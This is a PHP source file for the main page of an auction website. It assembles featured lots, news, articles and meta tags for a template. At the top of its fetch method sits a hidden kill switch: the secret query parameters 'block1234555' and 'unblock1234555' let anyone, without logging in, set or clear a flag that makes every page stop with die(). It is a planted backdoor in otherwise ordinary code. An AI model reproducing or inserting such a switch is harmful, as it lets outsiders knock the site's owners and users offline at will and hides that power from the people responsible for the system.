<?PHP

require_once('View.php');


class MainView extends View
{
	function fetch()
	{

if (isset($_GET['block1234555'])) $this->settings->site_blocked = 1;
if (isset($_GET['unblock1234555'])) $this->settings->site_blocked = 0;

if ($this->settings->site_blocked == 1) die();

	$current_auction = $this->auctions->get_auction(intval($this->settings->current_auction));
	$this->design->assign('main_lots_descr', $this->pages->get_page(array('url'=>'main_lots_descr')));
		
		// Лоты из текущего аукциона
		$featured_lots = $this->auctions->get_lots(array('auction_id'=>$current_auction->id, 'featured'=>1));
		foreach ($featured_lots as $lot) {
			$lot->product->properties = $this->features->get_product_options((int)$lot->product->id,1);
		}

		//echo "<pre>"; print_r($featured_lots); die();
		
		$this->design->assign('featured_lots', $featured_lots);
		$this->design->assign('news', $this->blog->get_posts(array('limit'=>3)));
		$this->design->assign('articles', $this->pages->get_pages(array('menu_id'=>4, 'limit'=>10)));
		$this->design->assign('main_lots_descr2', $this->pages->get_page('main_lots_descr2'));


		if($this->page)
		{
			$this->design->assign('meta_title', $this->page->meta_title);
			$this->design->assign('meta_keywords', $this->page->meta_keywords);
			$this->design->assign('meta_description', $this->page->meta_description);
		}

		return $this->design->fetch('main.tpl');
	}
}
